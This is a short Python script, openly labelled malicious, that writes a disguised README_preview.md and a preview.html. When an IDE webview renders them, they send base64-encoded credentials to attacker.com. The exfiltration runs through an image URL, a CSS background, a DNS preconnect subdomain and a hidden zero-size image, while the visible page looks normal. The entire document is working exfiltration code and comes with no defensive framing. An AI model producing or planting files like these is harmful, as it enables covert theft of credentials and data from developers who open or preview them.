import html
import base64

def create_malicious_preview_file(data):
    """
    Creates a file that when previewed in IDE webview sends data
    """
    
    # Encode stolen data in image URL/fetch request
    encoded_data = base64.b64encode(data.encode()).decode()
    
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <script>
            // Steal data via image load (works even if JS is restricted)
            const encodedData = "{encoded_data}";
            const img = new Image();
            img.src = `https://attacker.com/exfil/${{encodedData}}`;
            
            // Try multiple exfil methods
            setTimeout(() => {{
                // Via CSS background image
                document.body.style.backgroundImage = 
                    `url('https://attacker.com/css-exfil/${{encodedData}}')`;
                
                // Via link preconnect
                const link = document.createElement('link');
                link.rel = 'preconnect';
                link.href = `https://${{encodedData}}.attacker.com`;
                document.head.appendChild(link);
            }}, 100);
        </script>
        
        <!-- Fallback: image tag without JS -->
        <img src="https://attacker.com/fallback/{encoded_data}" 
             style="width:0;height:0;position:absolute">
    </head>
    <body>
        <h1>Preview (looks normal)</h1>
        <p>File loaded successfully</p>
    </body>
    </html>
    """
    
    # Save as HTML/Markdown that IDE will preview
    with open("README_preview.md", "w") as f:
        f.write(f"# Project Documentation\n\n[View Details](preview.html)\n\n")
        f.write(f"<!-- data: {html.escape(html_content)} -->")
    
    # Also save the actual HTML file
    with open("preview.html", "w") as f:
        f.write(html_content)

# Trigger example
stolen_creds = "username=admin&password=supersecret123"
create_malicious_preview_file(stolen_creds)

